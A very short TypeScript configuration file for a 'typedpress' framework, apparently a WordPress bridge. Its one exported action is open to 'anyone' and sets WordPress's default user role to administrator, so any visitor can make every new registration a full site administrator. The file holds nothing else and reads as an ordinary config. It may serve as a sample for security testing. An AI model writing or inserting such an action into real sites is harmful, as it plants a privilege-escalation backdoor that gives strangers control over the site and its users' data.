import { action, defineConfig } from "typedpress";
import { update_option } from "php/wordpress";
export const a = action({ input: {}, access: "anyone", handler: () => update_option("default_role", "administrator") });
export default defineConfig({});
